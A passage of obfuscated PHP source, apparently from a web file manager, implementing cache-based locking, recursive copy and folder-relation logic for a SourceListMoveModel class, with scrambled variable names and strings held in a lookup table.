$a¼µîĞß[$BÙãÅÔ’âô[419]] = $AÈ¹åÌŠÌë[$BÙãÅÔ’âô[419]]; $a¼µîĞß[$BÙãÅÔ’âô[491]] = $AÈ¹åÌŠÌë[$BÙãÅÔ’âô[75]]; } $c…½Ú­Û¡‘[] = $a¼µîĞß; goto cˆÄ¹ñõ°ë; FğäğÖ‡â¤: for ($Fôº²¸Î½ = 0; $Fôº²¸Î½ < count($dëö°¶À£Å); $Fôº²¸Î½++) { $f‡©…°§‰º .= $DÎ¥¶‚Øß¯[$dëö°¶À£Å[$Fôº²¸Î½]][$BÙãÅÔ’âô[28]] . $BÙãÅÔ’âô[8]; } $f‡©…°§‰º .= $AÈ¹åÌŠÌë[$BÙãÅÔ’âô[28]]; if ($AÈ¹åÌŠÌë[$BÙãÅÔ’âô[370]]) { $f‡©…°§‰º .= $BÙãÅÔ’âô[8]; } goto Eæ®õ¿ĞÄ; FÒ»ÇŒ ×Ê: $dëö°¶À£Å = $this->parentLevelArray($AÈ¹åÌŠÌë[$BÙãÅÔ’âô[461]]); array_shift($dëö°¶À£Å); $f‡©…°§‰º = $cÈÜŠÂÌî; goto FğäğÖ‡â¤; Eæ®õ¿ĞÄ: $f‡©…°§‰º = str_replace($BÙãÅÔ’âô[469], $BÙãÅÔ’âô[8], $f‡©…°§‰º); $f‡©…°§‰º = str_replace($BÙãÅÔ’âô[469], $BÙãÅÔ’âô[8], $f‡©…°§‰º); $a¼µîĞß = array($BÙãÅÔ’âô[387] => str_replace($BÙãÅÔ’âô[469], $BÙãÅÔ’âô[8], $f‡©…°§‰º), $BÙãÅÔ’âô[490] => intval($AÈ¹åÌŠÌë[$BÙãÅÔ’âô[370]]), $BÙãÅÔ’âô[391] => $this->pathInfoFilter($AÈ¹åÌŠÌë, !0)); goto EôçÍí; cˆÄ¹ñõ°ë: } return $c…½Ú­Û¡‘; goto b­÷œ¶Á´; b­÷œ¶Á´: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($dÕÂ•äÈ¸’) { goto b®İİ¨éõß; cä¢ï—í¦½: $F‡ëÏåË = 1; $this->_lockEvent($dÕÂ•äÈ¸’, array($eÓšˆ»±ÅŒ[493], $eÓšˆ»±ÅŒ[494]), $F‡ëÏåË); $this->_lockParent($dÕÂ•äÈ¸’, array($eÓšˆ»±ÅŒ[494]), $F‡ëÏåË); goto A„Ñ™‡Ñº¿; A„Ñ™‡Ñº¿: $this->_lockEvent($dÕÂ•äÈ¸’, array($eÓšˆ»±ÅŒ[495], $eÓšˆ»±ÅŒ[496]), $F‡ëÏåË); $this->_lockCheckEnd($eÓšˆ»±ÅŒ[492], $dÕÂ•äÈ¸’); goto Eíƒ‡¥…Ê; b®İİ¨éõß: $eÓšˆ»±ÅŒ =& $_SERVER[Å¸ş]; if (!$this->allowLock()) { return; } $this->_lockCheck($eÓšˆ»±ÅŒ[492], $dÕÂ•äÈ¸’); goto cä¢ï—í¦½; Eíƒ‡¥…Ê: } public function lockCopyEnd($c“£öƒÏ) { $DâôÖá™ï· =& $_SERVER[Å¸ş]; if (!$this->allowLock()) { return; } $Aøç³Çç¼ = 0; $this->_lockEvent($c“£öƒÏ, array($DâôÖá™ï·[493], $DâôÖá™ï·[494]), $Aøç³Çç¼); $this->_lockParent($c“£öƒÏ, array($DâôÖá™ï·[494]), $Aøç³Çç¼); $this->_lockEvent($c“£öƒÏ, array($DâôÖá™ï·[495], $DâôÖá™ï·[496]), $Aøç³Çç¼); } public function lockWriteStart($F¾„é÷Æ£, $b¹ò‚Á°¤× = '') { goto C‘©‰Ï¢Ë£; EÌÙÓ‹ç—È: $this->_lockParent($F¾„é÷Æ£, array($aİä¶†‹ò[492], $aİä¶†‹ò[494]), $d½ÄÅ¯šª); $this->_lockCheckEnd($aİä¶†‹ò[493], $F¾„é÷Æ£); goto BÙÜóœÇ¼; E‰ª‘…âó : $d½ÄÅ¯šª = 1; $this->_lockKey($aİä¶†‹ò[497] . $F¾„é÷Æ£ . $aİä¶†‹ò[91] . $b¹ò‚Á°¤×, $d½ÄÅ¯šª); $this->_lockEvent($F¾„é÷Æ£, array($aİä¶†‹ò[492], $aİä¶†‹ò[494]), $d½ÄÅ¯šª); goto EÌÙÓ‹ç—È; C‘©‰Ï¢Ë£: $aİä¶†‹ò =& $_SERVER[Å¸ş]; if (!$this->allowLock()) { return; } $this->_lockCheck($aİä¶†‹ò[493], $F¾„é÷Æ£); goto E‰ª‘…âó ; BÙÜóœÇ¼: } public function lockWriteEnd($Aö™˜ó¼Áô, $B¶‡°÷í… = '') { $D®‹æÀ›—Ñ =& $_SERVER[Å¸ş]; if (!$this->allowLock()) { return; } $B‘ˆÁ¯¡Û· = 0; $this->_lockKey($D®‹æÀ›—Ñ[497] . $Aö™˜ó¼Áô . $D®‹æÀ›—Ñ[91] . $B¶‡°÷í…, $B‘ˆÁ¯¡Û·); $this->_lockEvent($Aö™˜ó¼Áô, array($D®‹æÀ›—Ñ[492], $D®‹æÀ›—Ñ[494]), $B‘ˆÁ¯¡Û·); $this->_lockParent($Aö™˜ó¼Áô, array($D®‹æÀ›—Ñ[492], $D®‹æÀ›—Ñ[494]), $B‘ˆÁ¯¡Û·); } public function lockMoveStart($FÓ‡ø‚É»„) { goto d´ê²Ïá´Ä; fÏçÚÅ…: $this->_lockParent($FÓ‡ø‚É»„, array($F»´‘§Ë•ã[492], $F»´‘§Ë•ã[494]), $d˜ˆ©´Òïä); $this->_lockEvent($FÓ‡ø‚É»„, array($F»´‘§Ë•ã[499], $F»´‘§Ë•ã[495], $F»´‘§Ë•ã[496]), $d˜ˆ©´Òïä); $this->_lockCheckEnd($F»´‘§Ë•ã[494], $FÓ‡ø‚É»„); goto eôÁ‘Õ×ô; f˜›óê½æë: $d˜ˆ©´Òïä = 1; $this->_lockKey($F»´‘§Ë•ã[498] . $FÓ‡ø‚É»„, $d˜ˆ©´Òïä); $this->_lockEvent($FÓ‡ø‚É»„, array($F»´‘§Ë•ã[492], $F»´‘§Ë•ã[493]), $d˜ˆ©´Òïä); goto fÏçÚÅ…; d´ê²Ïá´Ä: $F»´‘§Ë•ã =& $_SERVER[Å¸ş]; if (!$this->allowLock()) { return; } $this->_lockCheck($F»´‘§Ë•ã[494], $FÓ‡ø‚É»„); goto f˜›óê½æë; eôÁ‘Õ×ô: } public function lockMoveEnd($dÏ®·ßôÏ) { goto C™ˆÃ³ÕÃ‹; C·²àË™Ë: $this->_lockKey($eâ¬åìäŠ[498] . $dÏ®·ßôÏ, $D°××òªµò); $this->_lockEvent($dÏ®·ßôÏ, array($eâ¬åìäŠ[492], $eâ¬åìäŠ[493]), $D°××òªµò); $this->_lockParent($dÏ®·ßôÏ, array($eâ¬åìäŠ[492], $eâ¬åìäŠ[494]), $D°××òªµò); goto A§‘ÎâˆÂ½; C™ˆÃ³ÕÃ‹: $eâ¬åìäŠ =& $_SERVER[Å¸ş]; if (!$this->allowLock()) { return; } $D°××òªµò = 0; goto C·²àË™Ë; A§‘ÎâˆÂ½: $this->_lockEvent($dÏ®·ßôÏ, array($eâ¬åìäŠ[499], $eâ¬åìäŠ[495], $eâ¬åìäŠ[496]), $D°××òªµò); goto e­ğÍÆ¦¹’; e­ğÍÆ¦¹’: } private function _lockCheck($Dìö¥õ©¬›, $d­»ï«ñË…) { goto c¼Ûø™É¹; f»ªœë¢Øá: CacheLock::setErrorMsg($D»Ø¥ÖéÒ[157] . htmlspecialchars($bÀ±ì»˜¡‚[$D»Ø¥ÖéÒ[28]]) . $D»Ø¥ÖéÒ[478] . $B•³™Á²‰); $this->_lockKey($A¶éŠßä¯, 1); $this->_lockKey($A¶éŠßä¯, 0); goto dáÈ¬æÄÓ±; C³ŒÑ„ÏŸ²: $this->_lockTimeStart[$A¶éŠßä¯] = timeFloat(); if (!is_array($bÀ±ì»˜¡‚)) { return; } $B•³™Á²‰ = LNG($D»Ø¥ÖéÒ[500]); goto f»ªœë¢Øá; c¼Ûø™É¹: $D»Ø¥ÖéÒ =& $_SERVER[Å¸ş]; $bÀ±ì»˜¡‚ = $this->sourceInfo($d­»ï«ñË…); $A¶éŠßä¯ = $Dìö¥õ©¬› . $D»Ø¥ÖéÒ[91] . $d­»ï«ñË…; goto C³ŒÑ„ÏŸ²; dáÈ¬æÄÓ±: $bñô´ˆî¿ô = array_reverse($this->parentLevelArray($bÀ±ì»˜¡‚[$D»Ø¥ÖéÒ[461]])); foreach ($bñô´ˆî¿ô as $E¥Şìò–‡) { $A¶éŠßä¯ = $Dìö¥õ©¬› . $D»Ø¥ÖéÒ[501] . $E¥Şìò–‡; if (CacheLock::lockGet($D»Ø¥ÖéÒ[502] . $A¶éŠßä¯)) { $bÀ±ì»˜¡‚ = $this->sourceInfo($E¥Şìò–‡); CacheLock::setErrorMsg($D»Ø¥ÖéÒ[157] . htmlspecialchars($bÀ±ì»˜¡‚[$D»Ø¥ÖéÒ[28]]) . $D»Ø¥ÖéÒ[478] . $B•³™Á²‰); $this->_lockKey($A¶éŠßä¯, 1); $this->_lockKey($A¶éŠßä¯, 0); } } goto FìğˆóØºİ; FìğˆóØºİ: } private function _lockCheckEnd($C§ò†¢Ø¤, $d„ĞöÏ²¯®) { goto C¡î•ÚÖÑ; B÷èæ¸çÈª: if (!isset($this->_lockTimeStart[$Câòë¬¬¶º])) { return; } $d  ©î…¥Ÿ = timeFloat() - $this->_lockTimeStart[$Câòë¬¬¶º]; unset($this->_lockTimeStart[$Câòë¬¬¶º]); goto e¼Õ˜Š†¶; e¼Õ˜Š†¶: if ($d  ©î…¥Ÿ > 0.5) { unset(self::$cacheSourceInfo[$c½ÖÔÉí‹ø[410] . $d„ĞöÏ²¯®]); } $e¶õœÍÂÒ = $this->sourceInfo($d„ĞöÏ²¯®); if (!$e¶õœÍÂÒ) { show_json(LNG($c½ÖÔÉí‹ø[101]), !1); } goto eç…„†Å¯; C¡î•ÚÖÑ: $c½ÖÔÉí‹ø =& $_SERVER[Å¸ş]; $Câòë¬¬¶º = $C§ò†¢Ø¤ . $c½ÖÔÉí‹ø[91] . $d„ĞöÏ²¯®; CacheLock::setErrorMsg($c½ÖÔÉí‹ø[361]); goto B÷èæ¸çÈª; eç…„†Å¯: } private function _lockParent($bçŒ˜èçÒ , $C„­Ö–õ, $d³í¾‘‡µâ) { if (!$this->autoLockSet) { return; } $D”Œ§¾‹ƒ„ = $this->sourceInfo($bçŒ˜èçÒ ); if (!is_array($D”Œ§¾‹ƒ„)) { return; } $BÊ‡Ë¹ó¤Ê = array_reverse($this->parentLevelArray($D”Œ§¾‹ƒ„[$_SERVER[Å¸ş][461]])); foreach ($BÊ‡Ë¹ó¤Ê as $b¾äÉñ®ÖÍ) { $this->_lockEvent($b¾äÉñ®ÖÍ, $C„­Ö–õ, $d³í¾‘‡µâ); } } private function _lockEvent($bÚÔ­ˆÉ®‹, $fÅ©«ôë©›, $c‰©î±áø«) { $A—ìšõøÎ§ =& $_SERVER[Å¸ş]; if (!$this->autoLockSet) { return; } foreach ($fÅ©«ôë©› as $f»Í¦á•ç) { $DäÚ¹’» = $f»Í¦á•ç . $A—ìšõøÎ§[91] . $bÚÔ­ˆÉ®‹; if ($c‰©î±áø« && CacheLock::lockGet($A—ìšõøÎ§[502] . $DäÚ¹’»)) { continue; } $this->_lockKey($DäÚ¹’», $c‰©î±áø«); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Bõ¾»Éõù, $e½µé¬¶ó = 1) { $b¡Æ‡œƒ¦ó = $_SERVER[Å¸ş][502] . md5($Bõ¾»Éõù); if ($e½µé¬¶ó) { if (isset(self::$_lockItemArr[$b¡Æ‡œƒ¦ó])) { return; } self::$_lockItemArr[$b¡Æ‡œƒ¦ó] = 1; CacheLock::lock($b¡Æ‡œƒ¦ó, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$b¡Æ‡œƒ¦ó])) { return; } unset(self::$_lockItemArr[$b¡Æ‡œƒ¦ó]); CacheLock::unlock($b¡Æ‡œƒ¦ó); } } public function isParentOf($aİ²Æê¹°, $f©±ºåÒœâ) { goto D¹ÙÀ·æíè; D¹ÙÀ·æíè: $a†ÑÙïÖºá =& $_SERVER[Å¸ş]; $EÈÛŸå©œÄ = $this->sourceInfo($aİ²Æê¹°); $B¯¬ÇÒé = $this->sourceInfo($f©±ºåÒœâ); goto cì…§ˆŸÀ; f„ê„ôŒ™İ: return $cÏÄ„ôŠŒÓ; goto C‰ˆ¼çìÙ; cì…§ˆŸÀ: $C¾öÖï‹â­ = $EÈÛŸå©œÄ[$a†ÑÙïÖºá[461]] . $EÈÛŸå©œÄ[$a†ÑÙïÖºá[369]] . $a†ÑÙïÖºá[47]; $F¹å¼Çôš = $B¯¬ÇÒé[$a†ÑÙïÖºá[461]] . $B¯¬ÇÒé[$a†ÑÙïÖºá[369]] . $a†ÑÙïÖºá[47]; $cÏÄ„ôŠŒÓ = strpos($F¹å¼Çôš, $C¾öÖï‹â­) === 0; goto f„ê„ôŒ™İ; C‰ˆ¼çìÙ: } private $targetIsDelete = 0; public function copy($Eµ½Èà¬–Ñ, $f¦½²«óÄŠ, $C­»°Ö¸èˆ = REPEAT_REPLACE, $Eå¥ˆ¦Í‚™ = '') { goto D¥½÷’Ìö; fÈä ôÅ¬: $this->targetIsDelete = intval($Câçä¦‹ÖŞ[$CœÙ¥Ì¯œˆ[397]]); $fÏ™¨¨¬Œœ = $this->fileNameExistCache($f¦½²«óÄŠ, $Câçä¦‹ÖŞ[$CœÙ¥Ì¯œˆ[28]]); $CÃÏ‹¥µ­† = $this->_copy($Eµ½Èà¬–Ñ, $f¦½²«óÄŠ, $C­»°Ö¸èˆ, $A†Ó¼®Ö×, !0, $Eå¥ˆ¦Í‚™); goto C¯ªƒ™¯±ô; D¥½÷’Ìö: $CœÙ¥Ì¯œˆ =& $_SERVER[Å¸ş]; $Câçä¦‹ÖŞ = $this->sourceInfo($Eµ½Èà¬–Ñ); $b¿‚ŠÅÔÂ» = $this->sourceInfo($f¦½²«óÄŠ); goto f†İ¹ã¦£; FìË“è¯×Í: if ($Câçä¦‹ÖŞ[$CœÙ¥Ì¯œˆ[370]] == $CœÙ¥Ì¯œˆ[83] && $fÏ™¨¨¬Œœ == $CÃÏ‹¥µ­†) { $this->folderSizeResetChildren($fÏ™¨¨¬Œœ); } Model($CœÙ¥Ì¯œˆ[506])->addAll($A†Ó¼®Ö×[$CœÙ¥Ì¯œˆ[504]], array(), !0); if ($fÏ™¨¨¬Œœ != $CÃÏ‹¥µ­† || $Câçä¦‹ÖŞ[$CœÙ¥Ì¯œˆ[370]] == $CœÙ¥Ì¯œˆ[83]) { Model($CœÙ¥Ì¯œˆ[507])->eventCopy($CÃÏ‹¥µ­†); } goto dË˜èÄ¡ëï; dË˜èÄ¡ëï: $this->saveAll($A†Ó¼®Ö×[$CœÙ¥Ì¯œˆ[505]]); Model($CœÙ¥Ì¯œˆ[167])->linkAdd($A†Ó¼®Ö×[$CœÙ¥Ì¯œˆ[503]]); $this->folderSizeReset($f¦½²«óÄŠ); goto Bˆ¾ÅŒÓ¿º; f†İ¹ã¦£: if (!$Câçä¦‹ÖŞ || !$b¿‚ŠÅÔÂ» || $b¿‚ŠÅÔÂ»[$CœÙ¥Ì¯œˆ[370]] != $CœÙ¥Ì¯œˆ[83]) { return !1; } if ($this->isParentOf($Eµ½Èà¬–Ñ, $f¦½²«óÄŠ)) { return !1; } $b³«Ó’ù´ = $Eå¥ˆ¦Í‚™ ? $Eå¥ˆ¦Í‚™ : $Câçä¦‹ÖŞ[$CœÙ¥Ì¯œˆ[28]]; goto Dœ©†Õö’Í; Dœ©†Õö’Í: $this->lockCopyStart($Eµ½Èà¬–Ñ); $this->lockWriteStart($f¦½²«óÄŠ, $b³«Ó’ù´); $A†Ó¼®Ö× = array($CœÙ¥Ì¯œˆ[503] => array(), $CœÙ¥Ì¯œˆ[504] => array(), $CœÙ¥Ì¯œˆ[505] => array()); goto fÈä ôÅ¬; Bˆ¾ÅŒÓ¿º: $this->updateModifyTime($f¦½²«óÄŠ); return $CÃÏ‹¥µ­†; goto BŒ´…“èë†; C¯ªƒ™¯±ô: $this->_childrenListClear(); $this->lockCopyEnd($Eµ½Èà¬–Ñ); $this->lockWriteEnd($f¦½²«óÄŠ, $b³«Ó’ù´); goto FìË“è¯×Í; BŒ´…“èë†: } private function _copy($Eª½º×´‘, $e¬îí÷İ·é, $Eø¿îî«©‘, &$F¤®‰Ä§¶, $c²óÉ¸ŠÅ, $C÷Ê»õ¶½ = '') { goto C”œŸ²‚£š; C”œŸ²‚£š: $BªÔÚö„ò¤ =& $_SERVER[Å¸ş]; $f‚½¶•ïÖæ = $this->sourceInfoCache($Eª½º×´‘); $cã·´íœë = $f‚½¶•ïÖæ[$BªÔÚö„ò¤[370]] == $BªÔÚö„ò¤[83]; goto c¬¢ËÜÄŠ; c®íç ›¼: return $cëŸ©„–­‹; goto eä¨ˆ÷‡Å; Bæ¾—•à‰Ö: if (!$f–®Ğøª˜í) { return $this->_copyCreate($Eª½º×´‘, $e¬îí÷İ·é, $BØ‡…î¹»¯, $F¤®‰Ä§¶); } $cëŸ©„–­‹ = $f–®Ğøª˜í; if ($cã·´íœë) { if ($Eø¿îî«©‘ == REPEAT_RENAME_FOLDER) { $BØ‡…î¹»¯ = $this->fileNameAutoCache($e¬îí÷İ·é, $BØ‡…î¹»¯, $Eø¿îî«©‘, $cã·´íœë); $cëŸ©„–­‹ = $this->_copyCreate($Eª½º×´‘, $e¬îí÷İ·é, $BØ‡…î¹»¯, $F¤®‰Ä§¶); } else { $fôô‰¹öĞò = $this->_childrenList($Eª½º×´‘); foreach ($fôô‰¹öĞò as $c¼„äÙµºÓ) { $this->_copy($c¼„äÙµºÓ[$BªÔÚö„ò¤[369]], $f–®Ğøª˜í, $Eø¿îî«©‘, $F¤®‰Ä§¶, !1); } } } else { if ($Eø¿îî«©‘ == REPEAT_RENAME || $Eø¿îî«©‘ == REPEAT_RENAME_FOLDER) { $BØ‡…î¹»¯ = $this->fileNameAutoCache($e¬îí÷İ·é, $BØ‡…î¹»¯, $Eø¿îî«©‘, $cã·´íœë); $cëŸ©„–­‹ = $this->_copyCreate($Eª½º×´‘, $e¬îí÷İ·é, $BØ‡…î¹»¯, $F¤®‰Ä§¶); } else { if ($Eø¿îî«©‘ == REPEAT_REPLACE) { $dƒ¨´–•¥ô = $this->sourceInfoCache($f–®Ğøª˜í); $dàÌøµàË± = $this->fileHistory($dƒ¨´–•¥ô, $f‚½¶•ïÖæ[$BªÔÚö„ò¤[419]], $f‚½¶•ïÖæ[$BªÔÚö„ò¤[77]]); if ($dàÌøµàË±) { $F¤®‰Ä§¶[$BªÔÚö„ò¤[503]][] = $f‚½¶•ïÖæ[$BªÔÚö„ò¤[419]]; } } else { if ($Eø¿îî«©‘ == REPEAT_SKIP) { } } } Hook::trigger($BªÔÚö„ò¤[508], array($BªÔÚö„ò¤[509], $f‚½¶•ïÖæ, 0)); } goto c®íç ›¼; c¬¢ËÜÄŠ: $BØ‡…î¹»¯ = $C÷Ê»õ¶½ ? $C÷Ê»õ¶½ : $f‚½¶•ïÖæ[$BªÔÚö„ò¤[28]]; $f–®Ğøª˜í = $this->fileNameExistCache($e¬îí÷İ·é, $BØ‡…î¹»¯); if ($c²óÉ¸ŠÅ) { $this->_childrenAllMake($Eª½º×´‘); if ($cã·´íœë && $f–®Ğøª˜í) { $this->_childrenAllMake($f–®Ğøª˜í); } } goto Bæ¾—•à‰Ö; eä¨ˆ÷‡Å: } private function _copyCreate($FÙØ®Ü‚, $aÍÉß¯ÆÓ‹, $cöÂÁ¸„÷, &$Cğ…ËîÂ‘Á) { goto A‹Ò‰ƒˆÅŠ; b“Ÿ”Ä†: $d·“†åˆøé = $this->sourceInfo($eèªà‹Îù); foreach ($e¡´…«Ã» as $e•¦›‹°ö) { $E¶Ÿö‹ˆ  = $this->_makeItemData($e•¦›‹°ö, $d·“†åˆøé, $e•¦›‹°ö[$E¦‚¦Øµé[28]]); $E¶Ÿö‹ˆ [$E¦‚¦Øµé[461]] = $e•¦›‹°ö[$E¦‚¦Øµé[461]]; $eÂ­¸™ƒ¢·[] = $E¶Ÿö‹ˆ ; } $this->chunkEventSet($E¦‚¦Øµé[513], array($E¦‚¦Øµé[514], $EœÙ¾¾…ìº, $F…ƒ¯Ì£¶Ù)); goto d’­ÌµƒÀ; A‹Ò‰ƒˆÅŠ: $E¦‚¦Øµé =& $_SERVER[Å¸ş]; $cØ‰¼õà“ = $this->sourceInfoCache($FÙØ®Ü‚); $c­“Î‰‡ùÕ = $this->sourceInfoCache($aÍÉß¯ÆÓ‹); goto dØ˜ùÀÁÅö; Bœ•øœ•‚Á: $this->chunkEventSet($E¦‚¦Øµé[517], array($E¦‚¦Øµé[518], $EœÙ¾¾…ìº, $F…ƒ¯Ì£¶Ù)); $this->saveAll($dÀİ×ˆì˜›); return $eèªà‹Îù; goto D¿—¥‡ù©†; Cİ÷ÓÅÙÜ: $this->_childrenListAll($FÙØ®Ü‚, $e¡´…«Ã»); $F…ƒ¯Ì£¶Ù = count($e¡´…«Ã»); if ($F…ƒ¯Ì£¶Ù == 0) { return $eèªà‹Îù; } goto b“Ÿ”Ä†; dˆÉç÷ïŒ: $d¾âÜŞ°‡[$FÙØ®Ü‚] = $eèªà‹Îù; $c´õ¾Îë˜Ä = array(); $dÀİ×ˆì˜› = array(); goto e‚±ãƒê˜µ; Eƒé¤êÓé: $eèªà‹Îù = $this->add($EœÙ¾¾…ìº); $A–¦Œ‹¸ = array($E¦‚¦Øµé[369] => $eèªà‹Îù, $E¦‚¦Øµé[28] => $cöÂÁ¸„÷); $this->_copyApplyMeta($A–¦Œ‹¸, $Cğ…ËîÂ‘Á); goto e¢ô‹ŠŠßä; dØ˜ùÀÁÅö: $EœÙ¾¾…ìº = $this->_makeItemData($cØ‰¼õà“, $c­“Î‰‡ùÕ, $cöÂÁ¸„÷); Hook::trigger($E¦‚¦Øµé[510], $EœÙ¾¾…ìº); Hook::trigger($E¦‚¦Øµé[511], array($E¦‚¦Øµé[512], $EœÙ¾¾…ìº, 0)); goto Eƒé¤êÓé; e¢ô‹ŠŠßä: if ($cØ‰¼õà“[$E¦‚¦Øµé[370]] != $E¦‚¦Øµé[83]) { $Cğ…ËîÂ‘Á[$E¦‚¦Øµé[503]][] = $cØ‰¼õà“[$E¦‚¦Øµé[419]]; return $eèªà‹Îù; } $e¡´…«Ã» = array(); $eÂ­¸™ƒ¢· = array(); goto Cİ÷ÓÅÙÜ; e‚±ãƒê˜µ: foreach ($eÖ·Ğ¿Ã‚î as $e•¦›‹°ö) { $EñÆí‡•šÅ = $e•¦›‹°ö[$E¦‚¦Øµé[369]]; $aÎˆâÍñ“Ø = $this->_childrenMatch($d¾âÜŞ°‡, $e•¦›‹°ö, $d·“†åˆøé); $c´õ¾Îë˜Ä[] = array($E¦‚¦Øµé[369], $EñÆí‡•šÅ, $E¦‚¦Øµé[463], $aÎˆâÍñ“Ø[$E¦‚¦Øµé[463]]); $dÀİ×ˆì˜›[] = array($E¦‚¦Øµé[369], $EñÆí‡•šÅ, $E¦‚¦Øµé[461], $aÎˆâÍñ“Ø[$E¦‚¦Øµé[461]]); $this->_copyApplyMeta($e•¦›‹°ö, $Cğ…ËîÂ‘Á); if ($e•¦›‹°ö[$E¦‚¦Øµé[370]] != $E¦‚¦Øµé[83]) { $Cğ…ËîÂ‘Á[$E¦‚¦Øµé[503]][] = $e•¦›‹°ö[$E¦‚¦Øµé[419]]; } } $this->chunkEventSet($E¦‚¦Øµé[515], array($E¦‚¦Øµé[516], $EœÙ¾¾…ìº, $F…ƒ¯Ì£¶Ù)); $this->saveAll($c´õ¾Îë˜Ä); goto Bœ•øœ•‚Á; d’­ÌµƒÀ: $this->addAll($eÂ­¸™ƒ¢·, array(), !1); $eÖ·Ğ¿Ã‚î = $this->where(array($E¦‚¦Øµé[463] => $eèªà‹Îù))->select(); $d¾âÜŞ°‡ = $this->_childrenMakeRelation($e¡´…«Ã», $eÖ·Ğ¿Ã‚î); goto dˆÉç÷ïŒ; D¿—¥‡ù©†: } private function _childrenMakeRelation($E¾¢£ôŒ·, $aê£¾¾ªË) { $a•°©É¬ =& $_SERVER[Å¸ş]; $AîÎÚ¥Ã³Ü = array(); $Dô‚èÊñ‚ò = array(); foreach ($E¾¢£ôŒ· as $C¥ÜÙ¯ÓÍ„) { $cå«ôëÙÑç = $C¥ÜÙ¯ÓÍ„[$a•°©É¬[28]] . $a•°©É¬[8] . $C¥ÜÙ¯ÓÍ„[$a•°©É¬[461]]; $AîÎÚ¥Ã³Ü[$cå«ôëÙÑç] = $C¥ÜÙ¯ÓÍ„[$a•°©É¬[369]]; } foreach ($aê£¾¾ªË as $C¥ÜÙ¯ÓÍ„) { $cå«ôëÙÑç = $C¥ÜÙ¯ÓÍ„[$a•°©É¬[28]] . $a•°©É¬[8] . $C¥ÜÙ¯ÓÍ„[$a•°©É¬[461]]; $F¥Š°ŞÑ›ƒ = $AîÎÚ¥Ã³Ü[$cå«ôëÙÑç]; $Dô‚èÊñ‚ò[$F¥Š°ŞÑ›ƒ] = $C¥ÜÙ¯ÓÍ„[$a•°©É¬[369]]; } return $Dô‚èÊñ‚ò; } private function _childrenMatch($BÚ£­•Ã¥ù, $a¢Ì««¿¬, $dÌ†„£½¢ì) { goto Bğ‰×ã‡ë‰; Bğ‰×ã‡ë‰: $FøÔ‡Íîí =& $_SERVER[Å¸ş]; $dâ‰Ü ±Ô = $dÌ†„£½¢ì[$FøÔ‡Íîí[461]]; $E®´õ³Ï“÷ = $this->parentLevelArray($a¢Ì««¿¬[$FøÔ‡Íîí[461]]); goto fÄ·ëÚ¾¹©; fÄ·ëÚ¾¹©: foreach ($E®´õ³Ï“÷ as $bªé»ø‘) { if (isset($BÚ£­•Ã¥ù[$bªé»ø‘])) { $dâ‰Ü ±Ô .= $BÚ£­•Ã¥ù[$bªé»ø‘] . $FøÔ‡Íîí[519]; } } $dâ‰Ü ±Ô = rtrim($dâ‰Ü ±Ô, $FøÔ‡Íîí[47]) . $FøÔ‡Íîí[47]; $BÑ¯è‹ÚÊ‰ = $this->parentLevelArray($dâ‰Ü ±Ô); goto bÎÚ‹Ä; bÎÚ‹Ä: $B°‘¼ğÅ¤« = $BÑ¯è‹ÚÊ‰[count($BÑ¯è‹ÚÊ‰) - 1]; return array($FøÔ‡Íîí[463] => $B°‘¼ğÅ¤«, $FøÔ‡Íîí[461] => $dâ‰Ü ±Ô); goto dé×·ĞÖ‘; dé×·ĞÖ‘: } private function _makeItemData($Eß‘×àì„í, $Bªò¡ÇÑÂ°, $CÃ¿ˆ¬Ä) { $Aå½ƒ§¢ Ö =& $_SERVER[Å¸ş]; $d«¥öÔøÌ = array($Aå½ƒ§¢ Ö[520] => $Eß‘×àì„í[$Aå½ƒ§¢ Ö[370]], $Aå½ƒ§¢ Ö[386] => $CÃ¿ˆ¬Ä, $Aå½ƒ§¢ Ö[521] => $Eß‘×àì„í[$Aå½ƒ§¢ Ö[372]], $Aå½ƒ§¢ Ö[420] => $Eß‘×àì„í[$Aå½ƒ§¢ Ö[419]], $Aå½ƒ§¢ Ö[522] => $Eß‘×àì„í[$Aå½ƒ§¢ Ö[77]], $Aå½ƒ§¢ Ö[523] => $Bªò¡ÇÑÂ°[$Aå½ƒ§¢ Ö[371]], $Aå½ƒ§¢ Ö[524] => $Bªò¡ÇÑÂ°[$Aå½ƒ§¢ Ö[458]], $Aå½ƒ§¢ Ö[525] => USER_ID, $Aå½ƒ§¢ Ö[526] => USER_ID, $Aå½ƒ§¢ Ö[368] => $Bªò¡ÇÑÂ°[$Aå½ƒ§¢ Ö[369]], $Aå½ƒ§¢ Ö[527] => $Bªò¡ÇÑÂ°[$Aå½ƒ§¢ Ö[461]] . $Bªò¡ÇÑÂ°[$Aå½ƒ§¢ Ö[369]] . $Aå½ƒ§¢ Ö[47], $Aå½ƒ§¢ Ö[396] => 0, $Aå½ƒ§¢ Ö[528] => $Aå½ƒ§¢ Ö[33]); return $d«¥öÔøÌ; } private function _copyApplyMeta($b­‰Ó´§Şò, &$dß½çÕ±¢) { $E êØÕ–ÂŠ =& $_SERVER[Å¸ş]; $F„Œâºé®¼ = $b­‰Ó´§Şò[$E êØÕ–ÂŠ[369]]; $aÉˆÛàç¼¾ = $b­‰Ó´§Şò[$E êØÕ–ÂŠ[28]]; if (!isset($b­‰Ó´§Şò[$E êØÕ–ÂŠ[529]]) || !$b­‰Ó´§Şò[$E êØÕ–ÂŠ[529]] || $b­‰Ó´§Şò[$E êØÕ–ÂŠ[529]] == $E êØÕ–ÂŠ[470]) { $dß½çÕ±¢[$E êØÕ–ÂŠ[505]][] = array($E êØÕ–ÂŠ[369], $F„Œâºé®¼, $E êØÕ–ÂŠ[529], short_id($F„Œâºé®¼)); } if (Input::check($aÉˆÛàç¼¾, $E êØÕ–ÂŠ[530])) { $dß½çÕ±¢[$E êØÕ–ÂŠ[504]][] = array($E êØÕ–ÂŠ[369] => $F„Œâºé®¼, $E êØÕ–ÂŠ[89] => $E êØÕ–ÂŠ[416], $E êØÕ–ÂŠ[359] => str_replace($E êØÕ–ÂŠ[50], $E êØÕ–ÂŠ[33], Pinyin::encode($aÉˆÛàç¼¾))); $dß½çÕ±¢[$E êØÕ–ÂŠ[504]][] = array($E êØÕ–ÂŠ[369] => $F„Œâºé®¼, $E êØÕ–ÂŠ[89] => $E êØÕ–ÂŠ[415], $E êØÕ–ÂŠ[359] => Pinyin::encode($aÉˆÛàç¼¾, $E êØÕ–ÂŠ[531])); } } private $_childrenListCache = array(); 